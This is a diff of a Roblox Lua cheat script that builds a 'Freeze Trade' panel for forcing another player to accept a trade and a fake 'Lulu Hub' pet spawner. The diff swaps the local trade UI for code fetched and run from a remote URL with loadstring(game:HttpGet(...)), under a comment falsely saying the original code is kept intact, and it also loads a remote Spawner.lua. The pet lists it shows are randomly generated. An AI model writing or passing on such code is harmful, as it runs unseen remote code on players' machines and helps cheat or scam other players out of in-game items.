@@ -1,21 +1,19 @@
+-- MASTER UI LOADER WITH UI SELECTOR
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-------------------------------------------------
--- UI SELECTOR PANEL
-------------------------------------------------
-
+-- Create Selector Panel
 local selectorGui = Instance.new("ScreenGui", playerGui)
 selectorGui.Name = "UISelector"
 selectorGui.ResetOnSpawn = false
 
 local selectorFrame = Instance.new("Frame", selectorGui)
 selectorFrame.Size = UDim2.new(0, 180, 0, 120)
-selectorFrame.Position = UDim2.new(0, 20, 0, 20)
+selectorFrame.Position = UDim2.new(0.5, -90, 0.5, -60)
 selectorFrame.BackgroundColor3 = Color3.fromRGB(44, 62, 80)
-
-local selectorCorner = Instance.new("UICorner", selectorFrame)
-selectorCorner.CornerRadius = UDim.new(0, 10)
+selectorFrame.Active = true
+selectorFrame.Draggable = true
+Instance.new("UICorner", selectorFrame).CornerRadius = UDim.new(0, 10)
 
 local function createSelectorButton(text, yOffset)
 	local btn = Instance.new("TextButton", selectorFrame)
@@ -26,143 +24,241 @@ local function createSelectorButton(text, yOffset)
 	btn.Font = Enum.Font.GothamBold
 	btn.TextScaled = true
 	btn.Text = text
-	local btnCorner = Instance.new("UICorner", btn)
-	btnCorner.CornerRadius = UDim.new(0, 8)
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
 	return btn
 end
 
 local openFreezeTradeBtn = createSelectorButton("Open Freeze Trade UI", 10)
 local openLuluHubBtn = createSelectorButton("Open Lulu Hub UI", 60)
 
-------------------------------------------------
--- UI A - Freeze Trade GUI
-------------------------------------------------
-
-local freezeGui = Instance.new("ScreenGui", playerGui)
-freezeGui.Name = "FreezeTradeUI"
+-- Freeze Trade GUI (your original code kept intact)
+local freezeGui = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/FreezeGui.lua"))()
+freezeGui.Parent = playerGui
 freezeGui.Enabled = false
 
-local freezeMain = Instance.new("Frame", freezeGui)
-freezeMain.Size = UDim2.new(0, 350, 0, 200)
-freezeMain.Position = UDim2.new(0.5, -175, 0.5, -100)
-freezeMain.BackgroundColor3 = Color3.fromRGB(39, 42, 44)
-freezeMain.Active = true
-freezeMain.Visible = true
+-- Lulu Hub GUI
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 
-Instance.new("UICorner", freezeMain).CornerRadius = UDim.new(0, 12)
+local allPets = {
+	"Kitsune", "Raccoon", "Butterfly", "Disco Bee", "Corrupted Kitsune", "Dragonfly", "T-Rex"
+}
 
-local freezeTitle = Instance.new("TextLabel", freezeMain)
-freezeTitle.Size = UDim2.new(1, -40, 0, 40)
-freezeTitle.Position = UDim2.new(0, 0, 0, 5)
-freezeTitle.BackgroundTransparency = 1
-freezeTitle.TextColor3 = Color3.new(1, 1, 1)
-freezeTitle.Font = Enum.Font.GothamBold
-freezeTitle.Text = "Freeze Trade (BETA)"
-freezeTitle.TextScaled = true
+local gui = Instance.new("ScreenGui")
+gui.Name = "LuluHubUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.Enabled = false
 
-local input = Instance.new("TextBox", freezeMain)
-input.Size = UDim2.new(0, 310, 0, 40)
-input.Position = UDim2.new(0.5, -155, 0, 55)
-input.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-input.Text = "Target Player Username"
-input.TextColor3 = Color3.fromRGB(127, 129, 131)
-input.ClearTextOnFocus = true
-input.Font = Enum.Font.SourceSans
-input.TextSize = 18
-Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)
+-- Loading screen
+local loadingFrame = Instance.new("Frame", gui)
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+loadingFrame.ZIndex = 10
 
-local forceBtn = Instance.new("TextButton", freezeMain)
-forceBtn.Size = UDim2.new(0, 310, 0, 35)
-forceBtn.Position = UDim2.new(0.5, -155, 0, 105)
-forceBtn.BackgroundColor3 = Color3.fromRGB(22, 160, 133)
-forceBtn.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
-forceBtn.TextColor3 = Color3.new(1, 1, 1)
-forceBtn.Font = Enum.Font.GothamBold
-forceBtn.TextSize = 16
-Instance.new("UICorner", forceBtn).CornerRadius = UDim.new(0, 8)
+local message = Instance.new("TextLabel", loadingFrame)
+message.Size = UDim2.new(0.8, 0, 0.1, 0)
+message.Position = UDim2.new(0.1, 0, 0.45, 0)
+message.Text = "🌸 Lulu Hub is preparing... Please wait 20 seconds"
+message.TextColor3 = Color3.new(1, 1, 1)
+message.BackgroundTransparency = 1
+message.TextScaled = true
+message.Font = Enum.Font.GothamBold
+message.TextStrokeTransparency = 0.4
+message.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
-local freezeBtn = Instance.new("TextButton", freezeMain)
-freezeBtn.Size = UDim2.new(0, 310, 0, 35)
-freezeBtn.Position = UDim2.new(0.5, -155, 0, 150)
-freezeBtn.BackgroundColor3 = Color3.fromRGB(26, 188, 156)
-freezeBtn.Text = "FREEZE PLAYER SCREEN"
-freezeBtn.TextColor3 = Color3.new(1, 1, 1)
-freezeBtn.Font = Enum.Font.GothamBold
-freezeBtn.TextSize = 16
-Instance.new("UICorner", freezeBtn).CornerRadius = UDim.new(0, 8)
+local glow = Instance.new("UIStroke", message)
+glow.Thickness = 2
+glow.Color = Color3.fromRGB(255, 255, 255)
+glow.Transparency = 0.5
 
-local closeFreeze = Instance.new("TextButton", freezeMain)
-closeFreeze.Size = UDim2.new(0, 30, 0, 30)
-closeFreeze.Position = UDim2.new(1, -35, 0, 5)
-closeFreeze.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-closeFreeze.Text = "X"
-closeFreeze.Font = Enum.Font.GothamBold
-closeFreeze.TextColor3 = Color3.new(1, 1, 1)
-closeFreeze.TextSize = 20
-Instance.new("UICorner", closeFreeze).CornerRadius = UDim.new(0, 8)
+-- Toggle Button
+local toggleBtn = Instance.new("TextButton", gui)
+toggleBtn.Size = UDim2.new(0, 120, 0, 40)
+toggleBtn.Position = UDim2.new(0, 10, 0, 10)
+toggleBtn.Text = "🌸 Lulu Hub"
+toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextScaled = true
+toggleBtn.Visible = false
+toggleBtn.AutoButtonColor = true
 
-forceBtn.MouseButton1Click:Connect(function()
-	print("Force accept pressed on:", input.Text)
+-- Main Frame
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
+mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+mainFrame.Visible = false
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.BorderSizePixel = 0
+
+-- Header Bar
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 40)
+header.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
+
+local hubLabel = Instance.new("TextLabel", header)
+hubLabel.Size = UDim2.new(1, -40, 1, 0)
+hubLabel.Position = UDim2.new(0, 10, 0, 0)
+hubLabel.Text = "🌸 Lulu Hub"
+hubLabel.TextColor3 = Color3.new(1, 1, 1)
+hubLabel.BackgroundTransparency = 1
+hubLabel.Font = Enum.Font.GothamBold
+hubLabel.TextScaled = true
+
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 40, 0, 40)
+closeBtn.Position = UDim2.new(1, -40, 0, 0)
+closeBtn.Text = "❌"
+closeBtn.TextScaled = true
+closeBtn.BackgroundColor3 = Color3.fromRGB(80, 40, 40)
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.Font = Enum.Font.GothamBold
+
+closeBtn.MouseButton1Click:Connect(function()
+	mainFrame.Visible = false
 end)
 
-freezeBtn.MouseButton1Click:Connect(function()
-	print("Freeze screen pressed on:", input.Text)
+-- Sidebar
+local sidebar = Instance.new("Frame", mainFrame)
+sidebar.Size = UDim2.new(0.3, 0, 1, -40)
+sidebar.Position = UDim2.new(0, 0, 0, 40)
+sidebar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+
+local sidebarLabel = Instance.new("TextLabel", sidebar)
+sidebarLabel.Size = UDim2.new(1, 0, 0, 30)
+sidebarLabel.Text = "Players"
+sidebarLabel.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+sidebarLabel.TextColor3 = Color3.new(1, 1, 1)
+sidebarLabel.Font = Enum.Font.GothamBold
+sidebarLabel.TextScaled = true
+
+local playerScroll = Instance.new("ScrollingFrame", sidebar)
+playerScroll.Size = UDim2.new(1, 0, 1, -30)
+playerScroll.Position = UDim2.new(0, 0, 0, 30)
+playerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+playerScroll.ScrollBarThickness = 6
+playerScroll.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+-- Pet Panel
+local petPanel = Instance.new("Frame", mainFrame)
+petPanel.Size = UDim2.new(0.7, 0, 1, -40)
+petPanel.Position = UDim2.new(0.3, 0, 0, 40)
+petPanel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+local petScroll = Instance.new("ScrollingFrame", petPanel)
+petScroll.Size = UDim2.new(1, 0, 1, 0)
+petScroll.Position = UDim2.new(0, 0, 0, 0)
+petScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+petScroll.ScrollBarThickness = 6
+petScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+
+-- Logic
+local selectedBtn
+local selectedPlayer = nil
+local perPlayerPets = {}
+
+local function generatePetSet()
+	local count = math.random(2, 4)
+	local selected = {}
+	local used = {}
+	while #selected < count do
+		local pet = allPets[math.random(1, #allPets)]
+		if not used[pet] then
+			used[pet] = true
+			table.insert(selected, {name = pet, max = math.random(1,2), used = 0})
+		end
+	end
+	return selected
+end
+
+local function loadPlayers()
+	playerScroll:ClearAllChildren()
+	local y = 0
+	for _, plr in pairs(game.Players:GetPlayers()) do
+		local btn = Instance.new("TextButton", playerScroll)
+		btn.Size = UDim2.new(1, -8, 0, 30)
+		btn.Position = UDim2.new(0, 4, 0, y)
+		btn.Text = plr.Name
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		btn.Font = Enum.Font.Gotham
+		btn.TextScaled = true
+
+		if not perPlayerPets[plr.Name] then
+			perPlayerPets[plr.Name] = generatePetSet()
+		end
+
+		btn.MouseButton1Click:Connect(function()
+			selectedPlayer = plr.Name
+			if selectedBtn then
+				selectedBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+			end
+			btn.BackgroundColor3 = Color3.fromRGB(100, 80, 130)
+			selectedBtn = btn
+			loadPetList(perPlayerPets[plr.Name])
+		end)
+
+		y += 32
+	end
+	playerScroll.CanvasSize = UDim2.new(0, 0, 0, y)
+end
+
+function loadPetList(petList)
+	petScroll:ClearAllChildren()
+	local y = 0
+	for _, petData in ipairs(petList) do
+		local btn = Instance.new("TextButton", petScroll)
+		btn.Size = UDim2.new(1, -8, 0, 30)
+		btn.Position = UDim2.new(0, 4, 0, y)
+		btn.Text = petData.name .. " (" .. (petData.max - petData.used) .. ")"
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+		btn.Font = Enum.Font.Gotham
+		btn.TextScaled = true
+
+		btn.MouseButton1Click:Connect(function()
+			if petData.used < petData.max then
+				petData.used += 1
+				Spawner.SpawnPet(petData.name, 2, 1)
+				btn.Text = petData.name .. " (" .. (petData.max - petData.used) .. ")"
+				if petData.used >= petData.max then
+					btn.AutoButtonColor = false
+					btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end
+			end
+		end)
+
+		y += 32
+	end
+	petScroll.CanvasSize = UDim2.new(0, 0, 0, y)
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+	mainFrame.Visible = not mainFrame.Visible
+	if mainFrame.Visible then
+		perPlayerPets = {}
+		loadPlayers()
+		petScroll:ClearAllChildren()
+	end
 end)
 
-closeFreeze.MouseButton1Click:Connect(function()
-	freezeGui.Enabled = false
+task.delay(20, function()
+	loadingFrame:Destroy()
+	mainFrame.Visible = true
+	toggleBtn.Visible = true
+	loadPlayers()
 end)
 
-------------------------------------------------
--- UI B - Lulu Hub (simplified for demo)
-------------------------------------------------
-
-local luluGui = Instance.new("ScreenGui", playerGui)
-luluGui.Name = "LuluHubUI"
-luluGui.Enabled = false
-
-local luluMain = Instance.new("Frame", luluGui)
-luluMain.Size = UDim2.new(0, 400, 0, 250)
-luluMain.Position = UDim2.new(0.5, -200, 0.5, -125)
-luluMain.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-luluMain.Visible = true
-luluMain.Active = true
-luluMain.Draggable = true
-
-Instance.new("UICorner", luluMain).CornerRadius = UDim.new(0, 12)
-
-local luluTitle = Instance.new("TextLabel", luluMain)
-luluTitle.Size = UDim2.new(1, -40, 0, 40)
-luluTitle.Position = UDim2.new(0, 10, 0, 0)
-luluTitle.Text = "🌸 Lulu Hub"
-luluTitle.BackgroundTransparency = 1
-luluTitle.TextColor3 = Color3.new(1, 1, 1)
-luluTitle.Font = Enum.Font.GothamBold
-luluTitle.TextScaled = true
-
-local luluClose = Instance.new("TextButton", luluMain)
-luluClose.Size = UDim2.new(0, 30, 0, 30)
-luluClose.Position = UDim2.new(1, -35, 0, 5)
-luluClose.Text = "❌"
-luluClose.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-luluClose.TextColor3 = Color3.new(1, 1, 1)
-luluClose.Font = Enum.Font.GothamBold
-luluClose.TextScaled = true
-
-luluClose.MouseButton1Click:Connect(function()
-	luluGui.Enabled = false
-end)
-
-------------------------------------------------
--- SELECTOR LOGIC
-------------------------------------------------
-
+-- Selector Logic
 openFreezeTradeBtn.MouseButton1Click:Connect(function()
 	freezeGui.Enabled = true
-	luluGui.Enabled = false
+	gui.Enabled = false
 end)
 
 openLuluHubBtn.MouseButton1Click:Connect(function()
-	luluGui.Enabled = true
+	gui.Enabled = true
 	freezeGui.Enabled = false
 end)
